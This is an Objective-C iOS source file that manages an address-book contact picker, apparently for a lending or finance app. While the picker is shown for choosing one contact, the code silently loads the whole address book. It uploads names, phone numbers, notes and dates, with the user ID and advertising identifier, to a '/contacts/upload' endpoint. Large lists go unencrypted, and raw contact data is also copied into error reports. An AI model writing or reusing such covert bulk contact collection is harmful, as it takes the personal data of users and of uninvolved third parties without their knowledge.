//
//  DSAdressBookManager.m
//  GetPhoneBook
//
//  Created by EriceWang on 16/4/28.
//  Copyright © 2016年 Ericdong. All rights reserved.

#import "XQDAddressBookManager.h"
#import <AddressBook/AddressBook.h>
#import <AddressBookUI/AddressBookUI.h>
#import <APAddressBook/APAddressBook.h>
#import <APAddressBook/APContact.h>
#import <APAddressBook/APPhoneWithLabel.h>
#import "XQDJSONUtil.h"
#import "XQDJSONUtil.h"
#import "NSArray+Expand.h"
#import "Header.h"
#import "NSString+Expand.h"


#define TICK   NSDate *startTime = [NSDate date];
#define TOCK   NSLog(@"上传通讯录一共耗费时间: %f", -[startTime timeIntervalSinceNow]);
@interface XQDAddressBookManager ()
@property (strong, nonatomic) ABPeoplePickerNavigationController *picker;
@property (assign, nonatomic) BOOL uploaded;
@end
@implementation XQDAddressBookManager
+ (void)showAddressBookWithController:(UIViewController *)viewController result:(ResultBlock)resultBlock {
    if ([self sharedInstance].forbidAppear) {
        return;
    }
    [self sharedInstance].innerBlock = resultBlock;
    [self sharedInstance].picker = nil;
    [self sharedInstance].queue = dispatch_queue_create("cn.com.treefinance", DISPATCH_QUEUE_SERIAL);
    if ([self upLoadAllContacts]) {
        //在主线程中刷新UI
        dispatch_async(dispatch_get_main_queue(), ^{
            ABPeoplePickerNavigationController *personPicker = [self sharedInstance].picker;
            if (IOS_OR_LATER(8.0)) {
                personPicker.predicateForSelectionOfPerson = [NSPredicate predicateWithValue:false];
            }
            [viewController presentViewController:personPicker animated:YES completion:^{
                [self sharedInstance].forbidAppear = YES;
            }];
            __weak id weakSelf=self;
            APAddressBook *addressBook=[[APAddressBook alloc]init];
            addressBook.fieldsMask = APContactFieldAll;
//            dispatch_async([self sharedInstance].queue, ^{
                [addressBook loadContacts:^(NSArray *contacts, NSError *error) {
                    __strong typeof(self) strongSelf=weakSelf;
                    if (!error) {
                        dispatch_async([self sharedInstance].queue, ^{
                            NSArray* list=[strongSelf filterContacts:contacts];
                            [strongSelf uploadContactsToServer:list];
                        });
                    } else {
                        NSString *where = [NSString stringWithFormat:@"class:%@, function:%s, line:%d",NSStringFromClass(self.class), __FUNCTION__, __LINE__];
                        NSString *message = [NSString stringWithFormat:@"ErrorMsg:%@", error];
                        NSString *errorInfo = [where stringByAppendingString:message];
                        [[XQDJSONUtil sharedInstance] sendError:@{@"Error" : errorInfo} callback:^(BOOL success, id extra) {
                            if (success) {
                                NSLog(@"异常发送成功！");
                            } else {
                                NSLog(@"异常发送失败！");
                            }
                        }];
                        [strongSelf sharedInstance].innerBlock(NO, ContactCodeUnknownError, nil);
                    }
                }];

        });
    } else {
        if ([self sharedInstance].innerBlock) {
            [self sharedInstance].innerBlock(NO, ContactCodeNoPermit, nil);
        }
    }
}
//上传通讯录
+(void)uploadContactsToServer:(NSArray* _Nullable)contacts{
//    NSLog(@"contacts = %@", contacts);
    
    //    NSDictionary *dic = contacts.firstObject;
    //    NSMutableArray *arr = [NSMutableArray arrayWithArray:contacts];
    //    for (int i =0 ; i < 2000; i++) {
    //        [arr addObject:dic];
    //    }
    //    contacts = (NSArray *)arr;
    
    BOOL needEncript = contacts.count < 1000 ? YES : NO;
//    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *json = [contacts.json deleteMoreWhitespaceAndNewlineCharacter];
        BOOL isValidJSON = [json isValidJSONFormat];
        NSString *contactsString =  nil;
        NSString *str = contacts.json;
        NSInteger type = -1;
        if (isValidJSON) {
            contactsString = json;
            type = 0;
        } else {
            NSString *temp = [str stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
            NSArray *components = [temp componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
            components = [components filteredArrayUsingPredicate:[NSPredicate predicateWithFormat:@"self <> ''"]];
            temp = [components componentsJoinedByString:@""];//按单空格分割
            if ([temp isValidJSONFormat]) {
                type = 1;
                contactsString = temp;
            } else {
                type = 2;
                contactsString = str;
            }
        }
    
        NSDictionary *params =  @{
                                  @"userId":CUSTOMER_GET(userIdKey),
                                  @"contacts":contactsString,
                                  @"total":@(contacts==nil?0:contacts.count),
                                  @"device":[NSNumber numberWithInt:0],
                                  @"deviceKey":[XQDUtil idfa]
                                  } ;
        params = needEncript ? params.getParas : params.getParasWithoutEncript;
        [[XQDJSONUtil sharedInstance] getJSONAsync:GET_SERVICE(@"/contacts/upload") withData:params method:@"POST" success:^(NSDictionary *data) {
            NSString *successMsg = [NSString stringWithFormat:@"type = %@,encript:%@,contacts = %@" ,@(type),@(needEncript),str];
            if (type) {
                [[XQDJSONUtil sharedInstance] sendError:@{@"Success" : successMsg} callback:nil];
            }
            [self sharedInstance].uploaded=YES;
            if ([self sharedInstance].uploadAllContacts) {
                [self sharedInstance].uploadAllContacts(YES, ContactCodeNomal, nil);
            }
        } error:^(NSError *error, id responseData) {
            static BOOL needReupload = YES;
            if (needReupload) {
                needReupload = NO;
                [self uploadContactsToServer:contacts];
                if ([self sharedInstance].uploadAllContacts) {
                    [self sharedInstance].uploadAllContacts(NO, ContactCodeNetworkFail, nil);
                }
            }
            NSString *where = [NSString stringWithFormat:@"class:%@, function:%s, line:%d",NSStringFromClass(self.class), __FUNCTION__, __LINE__];
            NSString *message = [NSString stringWithFormat:@"ErrorMsg:%@, encript:%@, type = %@, contacts:%@", @(needEncript), error,@(type), str];
            NSString *errorInfo = [where stringByAppendingString:message];
            [[XQDJSONUtil sharedInstance] sendError:@{@"Error" : errorInfo} callback:nil];
        }];
}
//单独获取原始通讯录
+ (void)getOrignalContactsWithFilter:(BOOL)isFilterd result:(ResultBlock)uploadAllContacts {
    if ([APAddressBook access]==APAddressBookAccessDenied) {
        if (uploadAllContacts) {
            uploadAllContacts(NO, ContactCodeNoPermit, nil);
        }
    } else {
        APAddressBook *addressBook=[[APAddressBook alloc]init];
        addressBook.fieldsMask = APContactFieldAll;
        [addressBook loadContacts:^(NSArray *contacts, NSError *error) {
            if (!error && uploadAllContacts) {
                if (isFilterd) {
                    uploadAllContacts(YES, ContactCodeNomal, @{@"contacts" : [self filterContacts:contacts]});
                } else {
                    uploadAllContacts(YES, ContactCodeNomal, @{@"contacts" : contacts});
                }
            }
        }];
    }
}
#pragma selectContact
// 选择完联系人.
- (void)peoplePickerNavigationController:(ABPeoplePickerNavigationController*)peoplePicker didSelectPerson:(ABRecordRef)person property:(ABPropertyID)property identifier:(ABMultiValueIdentifier)identifier NS_AVAILABLE_IOS(8_0){
    NSDictionary* dict =[self getPersonInfo:person property:property identifier:identifier];
    if(self.innerBlock) {
        NSString *mobile = dict[@"mobile"];
        NSString *name = dict[@"name"];
        if(!mobile || [mobile isEqual:[NSNull null]] || !mobile.length) {
            _innerBlock(NO, ContactCodeNoMobile, nil);//有姓名无电话
        } else if (!name || [name isEqual:[NSNull null]] || !name.length) {
            _innerBlock(NO, ContactCodeNoName, nil);//有电话无姓名
        } else {
            _innerBlock(YES, ContactCodeNomal, dict);
        }
        self. forbidAppear = NO;
    }
}
// ios8以下：选择完联系人.返回YES，则会重新选择联系人，否则则会结束
- (BOOL)peoplePickerNavigationController:(ABPeoplePickerNavigationController *)peoplePicker shouldContinueAfterSelectingPerson:(ABRecordRef)person property:(ABPropertyID)property identifier:(ABMultiValueIdentifier)identifier NS_DEPRECATED_IOS(2_0, 8_0){
    [peoplePicker dismissViewControllerAnimated:YES completion:nil];
    NSDictionary* dict =[self getPersonInfo:person property:property identifier:identifier];
    if(self.innerBlock) {
        NSString *mobile = dict[@"mobile"];
        NSString *name = dict[@"name"];
        if(!mobile || [mobile isEqual:[NSNull null]] || !mobile.length) {
            _innerBlock(NO, ContactCodeNoMobile, nil);//有姓名无电话
        } else if (!name || [name isEqual:[NSNull null]] || !name.length) {
            _innerBlock(NO, ContactCodeNoName, nil);//有电话无姓名
        } else {
            _innerBlock(YES, ContactCodeNomal, dict);
        }
    }
    return NO;
}

// 选择联系人取消.
- (void)peoplePickerNavigationControllerDidCancel:(ABPeoplePickerNavigationController *)peoplePicker{
    if (_innerBlock) {
        _innerBlock(NO, ContactCodeNoSelect, nil);
        self.forbidAppear = NO;
    }
    [peoplePicker dismissViewControllerAnimated:YES completion:nil];
}
+ (BOOL)upLoadAllContacts{
    if ([self sharedInstance].uploaded) {
        return YES;
    }
    if ([APAddressBook access]==APAddressBookAccessDenied) {
        return NO;
    }
    return YES;
}
//过滤联系人信息，获取到需要的联系人数据结构
+ (NSArray*)filterContacts:(NSArray*)contacts{
    BOOL needFilter = contacts.count > 2000 ? YES : NO;
    NSMutableArray* result=[NSMutableArray array];
    for (APContact* contact in contacts) {
        NSMutableDictionary* ct=[NSMutableDictionary dictionaryWithDictionary:@{@"fn":GET_NONNIL_VAL(contact.firstName),@"mn":GET_NONNIL_VAL(contact.middleName),@"ln":GET_NONNIL_VAL(contact.lastName),@"insDt":GET_NONNIL_VAL(contact.creationDate),@"updDt":GET_NONNIL_VAL(contact.modificationDate),@"ext":GET_NONNIL_VAL(contact.note)}];
        if (contact.creationDate) {
            [ct setObject:[NSNumber numberWithInteger:[contact.creationDate timeIntervalSince1970]] forKey:@"insDt"];
        }
        if (contact.modificationDate) {
            [ct setObject:[NSNumber numberWithInteger:[contact.modificationDate timeIntervalSince1970]] forKey:@"updDt"];
        }
        NSInteger numberOfPhones=0;
        if (contact.phonesWithLabels!=nil) {
            numberOfPhones=contact.phonesWithLabels.count;
        }
        NSMutableArray* cns=[NSMutableArray array];
        NSInteger availbaleCount = 0;
        if (needFilter) {
            //隔离姓名为手机号的联系人
            BOOL availableContact = NO;
            NSString *fullName = [NSString stringWithFormat:@"%@ %@ %@", ct[@"fn"], ct[@"mn"], ct[@"ln"]];
            for (NSInteger i=0; availbaleCount < 3 && i < numberOfPhones; ++i) {
                APPhoneWithLabel* temp=[contact.phonesWithLabels objectAtIndex:i];
                NSString *phoneNumber = temp.phone ? : nil;
                if (![fullName containsString:phoneNumber] && phoneNumber) {
                    availbaleCount++;
                    availableContact = YES;
                    [cns addObject:@{@"type":GET_NONNIL_VAL(temp.localizedLabel),@"phone":phoneNumber}];
                }
            }
            if (availableContact) {
                [ct setObject:cns forKey:@"cns"];
                [result addObject:ct];
            }
        }else if(contacts.count > 0){
            for (NSInteger i=0; availbaleCount < 3 && i < numberOfPhones; ++i) {
                APPhoneWithLabel* temp=[contact.phonesWithLabels objectAtIndex:i];
                NSString *phoneNumber = temp.phone ? : nil;
                if (phoneNumber) {
                    availbaleCount++;
                    [cns addObject:@{@"type":GET_NONNIL_VAL(temp.localizedLabel),@"phone":phoneNumber}];
                }
            }
            [ct setObject:cns forKey:@"cns"];
            [result addObject:ct];
        }
        
    }
    
    return result;
}
//获取选定的联系人信息
-(NSDictionary*) getPersonInfo:(ABRecordRef)person property:(ABPropertyID)property identifier:(ABMultiValueIdentifier)identifier{
    NSString *firstName = (__bridge NSString *)ABRecordCopyValue(person, kABPersonFirstNameProperty);
    NSString *middleName= (__bridge NSString *)ABRecordCopyValue(person, kABPersonMiddleNameProperty);
    NSString *lastName = (__bridge NSString *)ABRecordCopyValue(person, kABPersonLastNameProperty);
    NSData *imageData = (__bridge NSData *)ABPersonCopyImageData(person);
    NSString *imageString = [imageData base64EncodedStringWithOptions:0];
    // Compose the full name.
    NSString *fullName = @"";
    NSString *imageBase64String = nil;
    imageBase64String = imageString ? : @"";
    
    // Before adding the first and the last name in the fullName string make sure that these values are filled in.
    if (lastName) {
        fullName = [fullName stringByAppendingString:lastName];
    }
    if(middleName){
        fullName = [fullName stringByAppendingString:@""];
        fullName = [fullName stringByAppendingString:middleName];
    }
    if (firstName) {
        fullName = [fullName stringByAppendingString:@""];
        fullName = [fullName stringByAppendingString:firstName];
    }
    CFTypeRef multivalue = ABRecordCopyValue(person, property);
    
    // Get the index of the selected number. Remember that the number multi-value property is being returned as an array.
    if (identifier==-1) {
        return @{@"name":fullName,@"mobile":@""};
    }
    
    CFIndex index = ABMultiValueGetIndexForIdentifier(multivalue, identifier);
    if (index>-1) {
        NSString *number = (__bridge NSString *)ABMultiValueCopyValueAtIndex(multivalue, index);
        NSLog(@"%@:%@",fullName,number);
        return @{@"name":fullName,@"mobile":number, @"imageString" : imageBase64String};
    }else{
        NSString *number=@"";
        ABMutableMultiValueRef phoneMulti = ABRecordCopyValue(person, kABPersonPhoneProperty);
        for(NSInteger i = 0; i < ABMultiValueGetCount(phoneMulti); i++){
            NSString *aPhone = (__bridge NSString*)ABMultiValueCopyValueAtIndex(phoneMulti, i);
            NSString *aLabel = (__bridge NSString*)ABMultiValueCopyLabelAtIndex(phoneMulti, i);
            NSLog(@"PhoneLabel:%@ Phone#:%@",aLabel,aPhone);
            if([aLabel isEqualToString:@"_$!<Mobile>!$_"]){
                number=aPhone;
                break;
            }
        }
        return @{@"name":fullName,@"mobile":number, @"imageString": imageBase64String};
    }
}
- (void)navigationController:(UINavigationController*)navigationController willShowViewController:(UIViewController *)viewController animated:(BOOL)animated{
    if([navigationController isKindOfClass:[ABPeoplePickerNavigationController class]]){
        navigationController.topViewController.navigationItem.leftBarButtonItem.title = nil;
        navigationController.topViewController.navigationItem.title=@"选择联系人";
        }
}

#pragma UploadAllContacts
//重新上传通讯录方法
+ (void)uploadAllContactsWithResult:(ResultBlock)uploadAllContacts {
    if ([APAddressBook access]==APAddressBookAccessDenied) {
        if (uploadAllContacts) {
            uploadAllContacts(NO, ContactCodeNoPermit, nil);
//            [self clear];
        }
    } else {
        APAddressBook *addressBook=[[APAddressBook alloc]init];
        addressBook.fieldsMask = APContactFieldAll;
        __weak typeof(self) weakSelf = self;
        [addressBook loadContacts:^(NSArray *contacts, NSError *error) {
            __strong typeof(self) strongSelf=weakSelf;
            if (!error) {
                [self sharedInstance].uploadAllContacts = uploadAllContacts;
                [strongSelf uploadContactsToServer:[strongSelf filterContacts:contacts]];
            }
        }];
    }
}
/**
 *  js调用上传所有联系人时组合返回参数
 *
 *  @return 组合后的返回参数
 */
+ (NSDictionary *)formatContactDataWithContacts:(NSArray *)contacts {
    return @{
             @"contacts" : contacts,
             @"total" : @(contacts==nil?0:contacts.count),
             @"device":[NSNumber numberWithInt:0],
             @"deviceKey":[XQDUtil idfa]
             };
}
#pragma lazyload
static XQDAddressBookManager  *manager ;
static dispatch_once_t onceToken;
+ (XQDAddressBookManager *)sharedInstance {
    dispatch_once(&onceToken, ^{
        manager = [[XQDAddressBookManager alloc] init];
    });
    return manager;
}
- (ABPeoplePickerNavigationController *)picker {
    if (!_picker) {
        _picker = [[ABPeoplePickerNavigationController alloc] init];
        _picker.peoplePickerDelegate = self;
        _picker.delegate = self;
    }
    return _picker;
}
//+ (void)clear {
//    onceToken = 0;
//    manager = nil;
//}

//+ (void)printMessage : (NSString *)title {
//   UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:nil message:title delegate:nil cancelButtonTitle:nil otherButtonTitles:@"OK", nil];
//    [alertView show];
//
//}
@end
